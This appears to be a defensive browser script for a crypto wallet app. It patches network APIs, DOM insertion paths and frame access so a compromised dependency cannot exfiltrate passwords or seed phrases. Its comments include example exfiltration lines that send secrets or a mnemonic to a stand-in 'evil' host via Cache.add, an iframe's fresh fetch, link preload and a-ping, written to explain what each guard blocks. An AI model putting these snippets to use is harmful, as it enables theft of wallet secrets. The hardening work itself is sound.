// Loaded as a plain classic <script> in index.html, BEFORE the
// type="module" bundle — so this runs before react/react-dom/any other
// dependency's own top-level module code ever executes, closing the same
// gap the worker-side guard (wallet.worker.ts) closes for the WASM side.
//
// This thread sees the password on every unlock, the biometric unwrapping
// key, a freshly generated or imported mnemonic during onboarding, and the
// words themselves on a Settings seed reveal. If any bundled dependency
// (react, react-dom, qrcode.react, jsqr, leaflet) were compromised, this is
// the thread it would exfiltrate from.
//
// Every network call this thread legitimately makes is same-origin (/api/*,
// proxied by worker/index.ts), save one: the public price file (see
// PUBLIC_PRICE_URL below, one exact URL, GET only). Honest limit:
// same-origin includes /api/backup/*, which
// stores caller-chosen data under a caller-chosen key and serves it back to
// anyone, so this guard cannot stop a determined exfiltration from this
// realm, and neither can top-level navigation (location.href = ...), which
// nothing here blocks. It raises the cost; it is not a boundary. The wallet
// worker's guard does not allow same-origin writes at all.
(function () {
  "use strict";

  function isSameOrigin(url) {
    try {
      return new URL(url, window.location.href).host === window.location.host;
    } catch {
      return false;
    }
  }

  // The one cross-origin request this thread makes: the price, a public file
  // the Worker's cron writes to our own R2 bucket (src/lib/price.ts), so the
  // most frequent request of an open app costs no Worker request. This exact
  // URL only (no query, no other path), GET only, fetch only: whatever a
  // compromised dependency tried to carry in it ends up at our own bucket's
  // domain, which nobody but the cron writes to and nobody else can read.
  var PUBLIC_PRICE_URL = "https://data.spendrr.app/price.json";
  function isAllowedCrossOrigin(request) {
    return request.url === PUBLIC_PRICE_URL && request.method === "GET";
  }

  var realFetch = window.fetch.bind(window);
  window.fetch = function (input, init) {
    // Never trust input.url directly: an attacker-controlled object with a
    // custom toString() (e.g. {toString: () => "https://evil/"}) has no
    // .url property, so a naive `input && input.url` reads as undefined and
    // looks same-origin here — but realFetch(input) still stringifies the
    // same object via toString() per the Fetch spec and sends it to the
    // attacker's host. Building a real Request forces the exact same
    // coercion this guard needs to check. Build it exactly once: if `input`
    // is itself a Request with a body, constructing a second Request from it
    // (e.g. re-passing the original `input` to realFetch below) consumes/
    // locks that body stream, and the real fetch then throws "Cannot
    // construct a Request with a Request object that has already been used"
    // — breaking every non-GET same-origin call. Reuse this same
    // constructed Request for the real fetch instead of building another
    // one from `input`.
    var request;
    try {
      // redirect "error" for the same reason the wallet worker's guard sets
      // it (src/lib/wallet/walletWorkerGuard.ts): the check below only sees the URL
      // that is *requested*, and fetch's default "follow" would let a 3xx
      // carry the request somewhere this guard never approved — a
      // same-origin redirector pointing off-origin would defeat the whole
      // check. Set in this one construction rather than by wrapping the
      // result, so the body stream isn't disturbed. Every same-origin call
      // this app makes (/api/price/*, /api/fees/*, /api/backup/*,
      // /api/push/*) answers directly; verified none of them redirect.
      request = new Request(input, Object.assign({}, init, { redirect: "error" }));
    } catch {
      return Promise.reject(new Error("Blocked unexpected network request"));
    }
    if (!isSameOrigin(request.url) && !isAllowedCrossOrigin(request)) {
      console.error("[fetch-guard] blocked unexpected fetch to " + request.url);
      return Promise.reject(new Error("Blocked unexpected network request"));
    }
    return realFetch(request);
  };

  // Cache.add()/addAll() issue a real network request that never passes
  // through window.fetch, so the check above never sees them:
  //   (await caches.open("x")).add("https://evil/?s=" + secret)
  // and CSP's connect-src `https:` lets it through. The wallet worker's guard
  // already blocks these (src/lib/wallet/walletWorkerGuard.ts); this realm didn't.
  // The page only ever uses Cache.put (src/lib/exit/exitNudge.ts, a local hint
  // for sw.js), which sends nothing.
  if (typeof Cache === "function" && Cache.prototype) {
    Cache.prototype.add = function () {
      console.error("[fetch-guard] blocked Cache.add");
      return Promise.reject(new Error("Cache.add is not used by this app"));
    };
    Cache.prototype.addAll = function () {
      console.error("[fetch-guard] blocked Cache.addAll");
      return Promise.reject(new Error("Cache.addAll is not used by this app"));
    };
  }

  // Coerce the URL to a string exactly once and reuse that string for both
  // the check and the real call, same reasoning as the fetch patch above: an
  // object with a stateful toString() (returns an allowed host the first
  // time, an attacker's host the second) would otherwise pass isSameOrigin
  // against one value while the real implementation re-stringifies the
  // untouched original and dispatches against a different one.
  var realXhrOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function (method, url) {
    var urlString = String(url);
    if (!isSameOrigin(urlString)) {
      console.error("[fetch-guard] blocked unexpected XHR to " + urlString);
      throw new Error("Blocked unexpected network request");
    }
    var rest = Array.prototype.slice.call(arguments, 2);
    return realXhrOpen.apply(this, [method, urlString].concat(rest));
  };

  if (navigator.sendBeacon) {
    // Patch the prototype method, not the instance — Navigator.prototype
    // .sendBeacon.call(navigator, url, data) would otherwise reach the
    // original unpatched function directly.
    var realSendBeacon = Navigator.prototype.sendBeacon;
    Navigator.prototype.sendBeacon = function (url, data) {
      var urlString = String(url);
      if (!isSameOrigin(urlString)) {
        console.error("[fetch-guard] blocked unexpected sendBeacon to " + urlString);
        return false;
      }
      return realSendBeacon.call(this, urlString, data);
    };
  }

  // Nothing this app uses needs EventSource — block it outright rather than
  // allowlisting, same policy as WebSocket gets in the wallet worker.
  if (window.EventSource) {
    window.EventSource = function () {
      throw new Error("EventSource is not used by this app");
    };
  }

  // Nothing this app ships uses WebSocket, but Vite's own dev-mode HMR
  // client opens a same-origin one (ws://.../  ) to the dev server — same
  // isSameOrigin() check as everything else above (compares .host, so the
  // ws/wss vs http/https scheme difference doesn't matter), not an outright
  // block. Cross-origin construction still throws.
  var RealWebSocket = window.WebSocket;
  window.WebSocket = function (url, protocols) {
    // Same single-coercion reasoning as XHR/sendBeacon above: check and
    // construct against the same string, not the original object twice.
    var urlString = String(url);
    if (!isSameOrigin(urlString)) {
      console.error("[fetch-guard] blocked unexpected WebSocket to " + urlString);
      throw new Error("Blocked unexpected network request");
    }
    return protocols === undefined ? new RealWebSocket(urlString) : new RealWebSocket(urlString, protocols);
  };
  window.WebSocket.prototype = RealWebSocket.prototype;
  // .prototype.constructor still points at the original constructor unless
  // fixed explicitly — RealWebSocket.prototype.constructor.call(...) would
  // otherwise reach the unpatched WebSocket directly.
  Object.defineProperty(RealWebSocket.prototype, "constructor", { value: window.WebSocket });

  // WebTransport is a network primitive in its own right, exactly like the
  // WebSocket above — it never touches fetch/XHR, and CSP is no backstop
  // either (connect-src is deliberately `https:`, see public/_headers, which
  // covers WebTransport's https:// URLs too). Nothing in this app uses it, so
  // block it outright rather than allowlisting, and close the same
  // `.prototype.constructor` hole the WebSocket patch above closes.
  if (typeof window.WebTransport === "function") {
    var RealWebTransport = window.WebTransport;
    window.WebTransport = function () {
      console.error("[fetch-guard] blocked WebTransport");
      throw new Error("WebTransport is not used by this app");
    };
    window.WebTransport.prototype = RealWebTransport.prototype;
    Object.defineProperty(RealWebTransport.prototype, "constructor", { value: window.WebTransport });
  }

  // A compromised bundled dependency could spawn its own realm to dodge
  // this guard entirely: new Worker(import.meta.url) gets a fresh, unpatched
  // fetch, and CSP's worker-src 'self' allows any same-origin script,
  // including this app's own bundle chunks. Only the app's own wallet
  // worker chunk (which patches itself, see wallet.worker.ts) is legitimate;
  // block everything else. Same for registering a rogue Service Worker —
  // only this app's own /sw.js is legitimate.
  var RealWorker = window.Worker;
  window.Worker = function (scriptURL, options) {
    var url;
    try {
      url = new URL(scriptURL, window.location.href).pathname;
    } catch {
      throw new Error("Blocked unexpected Worker");
    }
    // Production build names the chunk /assets/wallet.worker-<hash>.js; the
    // Vite dev server serves the unbundled source at /src/lib/wallet/wallet.worker.ts
    // instead — both are legitimate. The money chat worker (beta) is the only
    // other one; like the wallet worker it installs its own guard first
    // (src/lib/chat/chat.worker.ts). Nothing else is legitimate.
    var isWalletWorker = /^\/assets\/wallet\.worker-/.test(url) || url === "/src/lib/wallet/wallet.worker.ts";
    var isChatWorker = /^\/assets\/chat\.worker-/.test(url) || url === "/src/lib/chat/chat.worker.ts";
    if (!isSameOrigin(scriptURL) || !(isWalletWorker || isChatWorker)) {
      console.error("[fetch-guard] blocked unexpected Worker: " + scriptURL);
      throw new Error("Blocked unexpected Worker");
    }
    return new RealWorker(scriptURL, options);
  };
  window.Worker.prototype = RealWorker.prototype;
  Object.defineProperty(RealWorker.prototype, "constructor", { value: window.Worker });

  if (window.SharedWorker) {
    window.SharedWorker = function () {
      throw new Error("SharedWorker is not used by this app");
    };
  }

  if (navigator.serviceWorker && navigator.serviceWorker.register) {
    // Patch the prototype method, not the instance — assigning
    // navigator.serviceWorker.register only shadows it with an own property,
    // leaving ServiceWorkerContainer.prototype.register.call(navigator
    // .serviceWorker, "…/evil-sw.js") reachable unpatched. Same
    // instance-vs-prototype reasoning as the sendBeacon / WebSocket patches
    // above. (A cross-origin SW script is already refused by the browser, but
    // this also pins the same-origin script to /sw.js so a compromised
    // dependency can't register one of the app's own bundle chunks as a SW —
    // a fresh, unpatched realm — the way the Worker patch above blocks.)
    var swProto =
      typeof ServiceWorkerContainer === "function"
        ? ServiceWorkerContainer.prototype
        : Object.getPrototypeOf(navigator.serviceWorker);
    var realRegister = swProto.register;
    swProto.register = function (scriptURL, options) {
      var url;
      try {
        url = new URL(scriptURL, window.location.href).pathname;
      } catch {
        return Promise.reject(new Error("Blocked unexpected Service Worker"));
      }
      if (!isSameOrigin(scriptURL) || url !== "/sw.js") {
        console.error("[fetch-guard] blocked unexpected Service Worker: " + scriptURL);
        return Promise.reject(new Error("Blocked unexpected Service Worker"));
      }
      return realRegister.call(this, scriptURL, options);
    };
  }

  // --- Realm escape ------------------------------------------------------
  // Everything above patches only THIS realm's globals. A same-origin
  // <iframe> hands out a whole fresh Window whose fetch/XHR/sendBeacon/
  // Worker are all pristine, which defeats this entire file in three lines:
  //
  //   var f = document.createElement("iframe");
  //   document.body.appendChild(f);
  //   f.contentWindow.fetch("https://evil/", { method: "POST", body: mnemonic });
  //
  // about:blank needs no network and no CSP allowance — measured: a policy
  // with `frame-src 'none'; child-src 'none'` still yields a live
  // contentWindow with a native fetch, so CSP cannot close this.
  //
  // This app uses no frame of any kind, so shut it at both ends: refuse to
  // attach frame elements (attachment is what creates the nested browsing
  // context, and with it window[0]/window.frames[0], which are reachable
  // without touching the element), and null the contentWindow accessors as
  // a second line in case an insertion path below was missed.
  //
  // Honest limits: this raises the bar a long way but is not the boundary a
  // browser-enforced policy would be. The complete fix is to narrow
  // connect-src to the hosts actually needed and move Lightning-address/
  // LNURL resolution into the Worker, so the browser enforces the allowlist
  // rather than this file.
  var FRAME_TAGS = { IFRAME: 1, FRAME: 1, FRAMESET: 1, OBJECT: 1, EMBED: 1 };
  var FRAME_SELECTOR = "iframe,frame,frameset,object,embed";
  var FRAME_HTML_RE = /<\s*(iframe|frame|frameset|object|embed)\b/i;

  function blockFrame(where) {
    console.error("[fetch-guard] blocked attaching a frame element via " + where);
    return new Error("Frames are not used by this app");
  }

  // --- Passive / background resource exfiltration ----------------------
  // The scriptable network primitives are all patched above, but the DOM
  // has element-driven ones that never go through fetch/XHR and that the
  // CSP here cannot contain:
  //
  //   * <link rel="preload" as="fetch" href="https://evil/?s=SECRET"> — a
  //     GET the browser issues itself, governed by connect-src, which is
  //     deliberately `https:` (public/_headers), so any host passes. The
  //     rel=prefetch / prerender / dns-prefetch / preconnect variants too —
  //     the last two covered by NO directive at all, and still leaking the
  //     hostname over DNS / TLS SNI.
  //   * <a ping="https://evil/?s=SECRET"> + .click() — a background GET,
  //     connect-src again, page stays put.
  //   * fetchLater("https://evil/?s=SECRET") — a deferred beacon that fires
  //     at page discard, connect-src, never through fetch() (blocked near
  //     the WebRTC patch below).
  //   * <meta http-equiv="refresh" content="0;url=https://evil/…"> and
  //     <script type="speculationrules"> — navigation / speculation
  //     channels reachable by pure DOM injection.
  //
  // This app self-hosts its fonts, has no third-party origin, no external
  // <a>, no analytics ping and no innerHTML anywhere (all verified) — the
  // only <link> it creates at runtime is Vite's own same-origin
  // modulepreload / stylesheet for a lazy chunk (href is a resolved
  // same-origin URL set before the element is attached). So: a same-origin
  // <link> is fine, every other member of this family is refused. Honest
  // limit, same as the frame and window.open blocks — a dependency that
  // already runs script can still navigate the page away via location.*,
  // which nothing here attempts to stop.
  var RESOURCE_SELECTOR = 'link,a[ping],meta[http-equiv="refresh" i],script[type="speculationrules" i]';
  var COMBINED_SELECTOR = FRAME_SELECTOR + "," + RESOURCE_SELECTOR;
  try {
    // Case-insensitive attribute selectors (`[x=y i]`) are Selectors-4 —
    // present in every browser this app can run in, but fall back to a
    // broader selector rather than let a querySelector SyntaxError break
    // every insertion if that assumption is ever wrong. evaluateResourceEl
    // re-checks the attribute values precisely either way.
    document.createDocumentFragment().querySelector(RESOURCE_SELECTOR);
  } catch {
    RESOURCE_SELECTOR = "link,a[ping],meta[http-equiv],script[type]";
    COMBINED_SELECTOR = FRAME_SELECTOR + "," + RESOURCE_SELECTOR;
  }
  var RESOURCE_HTML_RES = [
    { re: /<\s*link\b/i, desc: "<link>" },
    { re: /<\s*a\b[^>]*\sping\s*=/i, desc: "<a ping>" },
    { re: /<\s*meta\b[^>]*\shttp-equiv\s*=\s*["']?\s*refresh\b/i, desc: "<meta http-equiv=refresh>" },
    { re: /<\s*script\b[^>]*\stype\s*=\s*["']?\s*speculationrules\b/i, desc: "<script type=speculationrules>" },
  ];

  function blockResource(what, where, url) {
    console.error("[fetch-guard] blocked " + what + " via " + where + (url ? " -> " + url : ""));
    return new Error("Blocked unexpected network request");
  }

  // Evaluate one already-built element against the family above. Returns an
  // Error to throw, or null to allow.
  function evaluateResourceEl(el, where) {
    if (!el || el.nodeType !== 1) return null;
    switch (el.tagName) {
      case "LINK": {
        // Absent/empty href resolves to the page URL (same-origin) and is
        // inert until changed — the href / setAttribute guards below catch
        // a later cross-origin assignment onto an already-attached <link>.
        var href = el.getAttribute("href");
        return href && !isSameOrigin(href)
          ? blockResource("<link> to a cross-origin destination", where, href)
          : null;
      }
      case "A": {
        var ping = el.getAttribute("ping");
        return ping ? blockResource("<a ping>", where, ping) : null;
      }
      case "META": {
        var httpEquiv = el.getAttribute("http-equiv");
        return httpEquiv && httpEquiv.toLowerCase().trim() === "refresh"
          ? blockResource("<meta http-equiv=refresh>", where, el.getAttribute("content") || "")
          : null;
      }
      case "SCRIPT": {
        var stype = el.getAttribute("type");
        return stype && stype.toLowerCase().trim() === "speculationrules"
          ? blockResource("<script type=speculationrules>", where, "")
          : null;
      }
      default:
        return null;
    }
  }

  // Screen a node about to be inserted: frames (unconditional) and the
  // resource family (conditional) in the node itself and its subtree.
  function screenNode(node, where) {
    if (!node || typeof node !== "object") return null;
    // Only elements (1) and document fragments (11) can carry one of these.
    // Bailing on text nodes first keeps this cheap — React's insert paths
    // below are hot and text nodes are the common case.
    var type = node.nodeType;
    if (type !== 1 && type !== 11) return null;

    if (type === 1 && FRAME_TAGS[node.tagName] === 1) return blockFrame(where);

    var selfErr = evaluateResourceEl(node, where);
    if (selfErr) return selfErr;

    if (typeof node.querySelector !== "function") return null;
    // One combined probe for the hot "nothing dangerous in here" path; only
    // when it hits do we pay for the per-element walk.
    if (node.querySelector(COMBINED_SELECTOR) === null) return null;
    if (node.querySelector(FRAME_SELECTOR) !== null) return blockFrame(where);
    var hits = node.querySelectorAll(RESOURCE_SELECTOR);
    for (var i = 0; i < hits.length; i++) {
      var err = evaluateResourceEl(hits[i], where);
      if (err) return err;
    }
    return null;
  }

  // Screen an HTML *string* (markup, not a node). <link> is refused
  // wholesale here — its href can't be resolved from a regex, and nothing
  // in this app ever puts a <link> in an HTML string.
  function screenHtmlString(value, where) {
    var s = String(value);
    if (FRAME_HTML_RE.test(s)) return blockFrame(where);
    for (var i = 0; i < RESOURCE_HTML_RES.length; i++) {
      if (RESOURCE_HTML_RES[i].re.test(s)) {
        return blockResource(RESOURCE_HTML_RES[i].desc + " in markup", where, "");
      }
    }
    return null;
  }

  function guardInsertion(proto, name) {
    if (!proto || typeof proto[name] !== "function") return;
    var real = proto[name];
    proto[name] = function () {
      for (var i = 0; i < arguments.length; i++) {
        var err = screenNode(arguments[i], name);
        if (err) throw err;
      }
      return real.apply(this, arguments);
    };
  }

  var NODE_INSERTERS = ["appendChild", "insertBefore", "replaceChild"];
  var PARENT_INSERTERS = ["append", "prepend", "replaceChildren", "before", "after", "replaceWith", "insertAdjacentElement"];
  for (var n = 0; n < NODE_INSERTERS.length; n++) guardInsertion(Node.prototype, NODE_INSERTERS[n]);
  for (var p = 0; p < PARENT_INSERTERS.length; p++) {
    guardInsertion(Element.prototype, PARENT_INSERTERS[p]);
    guardInsertion(Document.prototype, PARENT_INSERTERS[p]);
    guardInsertion(DocumentFragment.prototype, PARENT_INSERTERS[p]);
  }
  // Range-based insertion — a node path the frame block never covered.
  if (typeof Range !== "undefined") {
    guardInsertion(Range.prototype, "insertNode");
    guardInsertion(Range.prototype, "surroundContents");
  }

  // String-valued paths, where the element is markup rather than a node.
  function guardHtmlString(proto, name) {
    if (!proto || typeof proto[name] !== "function") return;
    var real = proto[name];
    proto[name] = function () {
      for (var i = 0; i < arguments.length; i++) {
        if (typeof arguments[i] === "string") {
          var err = screenHtmlString(arguments[i], name);
          if (err) throw err;
        }
      }
      return real.apply(this, arguments);
    };
  }
  guardHtmlString(Element.prototype, "insertAdjacentHTML");
  guardHtmlString(Element.prototype, "setHTMLUnsafe");
  guardHtmlString(Document.prototype, "write");
  guardHtmlString(Document.prototype, "writeln");
  if (typeof ShadowRoot !== "undefined") guardHtmlString(ShadowRoot.prototype, "setHTMLUnsafe");

  function guardHtmlSetter(proto, name) {
    if (!proto) return;
    var descriptor = Object.getOwnPropertyDescriptor(proto, name);
    if (!descriptor || typeof descriptor.set !== "function") return;
    Object.defineProperty(proto, name, {
      configurable: true,
      enumerable: descriptor.enumerable,
      get: descriptor.get,
      set: function (value) {
        var err = screenHtmlString(value, name);
        if (err) throw err;
        return descriptor.set.call(this, value);
      },
    });
  }
  guardHtmlSetter(Element.prototype, "innerHTML");
  guardHtmlSetter(Element.prototype, "outerHTML");
  if (typeof ShadowRoot !== "undefined") guardHtmlSetter(ShadowRoot.prototype, "innerHTML");

  // Attribute mutations that turn an already-attached, so-far-innocent
  // element into one of the exfil shapes above: `link.href = "https://…"`,
  // `a.ping = "https://…"`, etc. The insertion screen sees the element
  // before these run, so this closes the "attach an empty <link>, then set
  // its href" sequence.
  function evaluateAttrChange(el, name, value) {
    if (!el) return null;
    var attr = String(name).toLowerCase();
    switch (el.tagName) {
      case "LINK":
        return attr === "href" && value != null && String(value) !== "" && !isSameOrigin(String(value))
          ? blockResource("<link href> set cross-origin", "attribute", String(value))
          : null;
      case "A":
        return attr === "ping" && value != null && String(value) !== ""
          ? blockResource("<a ping> attribute", "attribute", String(value))
          : null;
      case "META":
        return attr === "http-equiv" && String(value).toLowerCase().trim() === "refresh"
          ? blockResource("<meta http-equiv=refresh>", "attribute", "")
          : null;
      case "SCRIPT":
        return attr === "type" && String(value).toLowerCase().trim() === "speculationrules"
          ? blockResource("<script type=speculationrules>", "attribute", "")
          : null;
      default:
        return null;
    }
  }

  function guardAttrMethod(name, pairFromArgs) {
    if (typeof Element.prototype[name] !== "function") return;
    var real = Element.prototype[name];
    Element.prototype[name] = function () {
      // Fast bail: only four element types can carry one of these attrs.
      var tag = this && this.tagName;
      if (tag === "LINK" || tag === "A" || tag === "META" || tag === "SCRIPT") {
        var pair = pairFromArgs(arguments);
        if (pair) {
          var err = evaluateAttrChange(this, pair[0], pair[1]);
          if (err) throw err;
        }
      }
      return real.apply(this, arguments);
    };
  }
  guardAttrMethod("setAttribute", function (a) {
    return [a[0], a[1]];
  });
  guardAttrMethod("setAttributeNS", function (a) {
    return [a[1], a[2]];
  });
  guardAttrMethod("setAttributeNode", function (a) {
    return a[0] ? [a[0].name, a[0].value] : null;
  });
  guardAttrMethod("setAttributeNodeNS", function (a) {
    return a[0] ? [a[0].name, a[0].value] : null;
  });

  // The IDL property counterparts of the setAttribute paths above
  // (`el.href = …` never goes through setAttribute).
  function guardIdlSetter(proto, prop, check) {
    if (!proto) return;
    var d = Object.getOwnPropertyDescriptor(proto, prop);
    if (!d || typeof d.set !== "function") return;
    Object.defineProperty(proto, prop, {
      configurable: true,
      enumerable: d.enumerable,
      get: d.get,
      set: function (value) {
        var err = check(value);
        if (err) throw err;
        return d.set.call(this, value);
      },
    });
  }
  if (typeof HTMLLinkElement !== "undefined") {
    guardIdlSetter(HTMLLinkElement.prototype, "href", function (value) {
      return value != null && String(value) !== "" && !isSameOrigin(String(value))
        ? blockResource("<link>.href", "property setter", String(value))
        : null;
    });
  }
  if (typeof HTMLAnchorElement !== "undefined") {
    guardIdlSetter(HTMLAnchorElement.prototype, "ping", function (value) {
      return value != null && String(value) !== ""
        ? blockResource("<a>.ping", "property setter", String(value))
        : null;
    });
  }

  // Second line: even if some insertion path was missed, don't hand back the
  // Window. (window[0] stays reachable for an attached frame, which is why
  // the attachment block above is the primary defence, not this.)
  var FRAME_PROTOS = [
    typeof HTMLIFrameElement !== "undefined" ? HTMLIFrameElement.prototype : null,
    typeof HTMLFrameElement !== "undefined" ? HTMLFrameElement.prototype : null,
    typeof HTMLObjectElement !== "undefined" ? HTMLObjectElement.prototype : null,
    typeof HTMLEmbedElement !== "undefined" ? HTMLEmbedElement.prototype : null,
  ];
  for (var fp = 0; fp < FRAME_PROTOS.length; fp++) {
    var frameProto = FRAME_PROTOS[fp];
    if (!frameProto) continue;
    var accessors = ["contentWindow", "contentDocument", "getSVGDocument"];
    for (var a = 0; a < accessors.length; a++) {
      if (!Object.getOwnPropertyDescriptor(frameProto, accessors[a])) continue;
      Object.defineProperty(frameProto, accessors[a], {
        configurable: true,
        get: function () {
          return null;
        },
      });
    }
  }

  // window.open() also returns a same-origin Window with pristine globals.
  // Nothing in this app opens a window.
  if (typeof window.open === "function") {
    window.open = function () {
      console.error("[fetch-guard] blocked window.open");
      return null;
    };
  }

  // fetchLater() is a deferred beacon that fires when the document is
  // discarded — governed by connect-src (deliberately `https:`) and never
  // routed through the fetch() patched above. Experimental and unused here.
  if (typeof window.fetchLater === "function") {
    window.fetchLater = function () {
      console.error("[fetch-guard] blocked fetchLater");
      throw new Error("fetchLater is not used by this app");
    };
  }

  // WebRTC is a network primitive in its own right — it never touches
  // fetch/XHR, and no CSP directive covers it, so a data channel or even a
  // STUN hostname is an exfiltration path around everything above. This app
  // has no WebRTC feature.
  var RTC_NAMES = ["RTCPeerConnection", "webkitRTCPeerConnection", "RTCDataChannel"];
  for (var r = 0; r < RTC_NAMES.length; r++) {
    if (!(RTC_NAMES[r] in window)) continue;
    (function (rtcName) {
      window[rtcName] = function () {
        console.error("[fetch-guard] blocked " + rtcName);
        throw new Error("WebRTC is not used by this app");
      };
    })(RTC_NAMES[r]);
  }
})();
